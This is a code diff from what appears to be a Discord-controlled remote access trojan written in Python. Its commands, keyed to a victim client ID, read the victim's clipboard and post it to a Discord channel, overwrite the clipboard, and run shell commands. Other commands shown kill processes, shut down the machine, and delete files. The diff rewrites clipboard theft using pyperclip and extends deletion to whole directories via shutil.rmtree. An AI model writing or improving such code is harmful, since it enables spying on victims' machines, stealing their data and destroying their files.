@@ -325,23 +325,8 @@ async def idletime(ctx, *, usid):
 @client.command()
 async def clipboard(ctx, *, usid):
     if usid == clientid:
-        CF_TEXT = 1
-        kernel32 = ctypes.windll.kernel32
-        kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
-        kernel32.GlobalLock.restype = ctypes.c_void_p
-        kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
-        user32 = ctypes.windll.user32
-        user32.GetClipboardData.restype = ctypes.c_void_p
-        user32.OpenClipboard(0)
-        if user32.IsClipboardFormatAvailable(CF_TEXT):
-            data = user32.GetClipboardData(CF_TEXT)
-            data_locked = kernel32.GlobalLock(data)
-            text = ctypes.c_char_p(data_locked)
-            value = text.value
-            kernel32.GlobalUnlock(data_locked)
-            body = value.decode()
-            user32.CloseClipboard()
-        await ctx.send(f"Clipboard content for **{os.getlogin()}** is : \n\n" + str(body))
+        current_clipboard = str(pyperclip.paste())
+        await ctx.send(f"Clipboard content for **{os.getlogin()}** is : \n\n{current_clipboard}")
 
 def _shellpw(command):
     output = subprocess.run(command, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
@@ -380,25 +365,12 @@ async def shutdown(ctx, *, usid):
 @client.command()
 async def setclipboard(ctx, usid, *, clipboard):
     if usid == clientid:
-        s1 = pyperclip.copy(clipboard)
-        s2 = pyperclip.paste()
-        CF_TEXT = 1
-        kernel32 = ctypes.windll.kernel32
-        kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
-        kernel32.GlobalLock.restype = ctypes.c_void_p
-        kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
-        user32 = ctypes.windll.user32
-        user32.GetClipboardData.restype = ctypes.c_void_p
-        user32.OpenClipboard(0)
-        if user32.IsClipboardFormatAvailable(CF_TEXT):
-            data = user32.GetClipboardData(CF_TEXT)
-            data_locked = kernel32.GlobalLock(data)
-            text = ctypes.c_char_p(data_locked)
-            value = text.value
-            kernel32.GlobalUnlock(data_locked)
-            body = value.decode()
-            user32.CloseClipboard()
-        await ctx.send(f'Successfully set the clipboard to **{str(body)}**')
+        try:
+            pyperclip.copy(clipboard)
+        except Exception as e: 
+            await ctx.send(f'Error trying to set clipboard for **{os.getlogin()}**: `{e}`')
+        current_clipboard = str(pyperclip.paste())
+        await ctx.send(f'Successfully set the clipboard to **{current_clipboard}** for **{os.getlogin()}**')
 
 @client.command()
 async def forcedesktop(ctx, *, usid):
@@ -910,8 +882,13 @@ async def taskkill(ctx, usid, *, proc):
 async def delfile(ctx, usid, *, filepath):
     if usid == clientid:
         try:
-            os.remove(filepath)
-            await ctx.send(f"Deleted **{filepath}** from **{os.getlogin()}**")
+            if os.path.exists(filepath):
+                if os.path.isdir(filepath):
+                    shutil.rmtree(filepath)
+                    await ctx.send(f"Deleted directory **{filepath}** from **{os.getlogin()}**")
+                    return
+                os.remove(filepath)
+                await ctx.send(f"Deleted file **{filepath}** from **{os.getlogin()}**")
         except WindowsError as e:
             await ctx.send(f"System error trying to delete **{filepath}** from **{os.getlogin()}**")
 
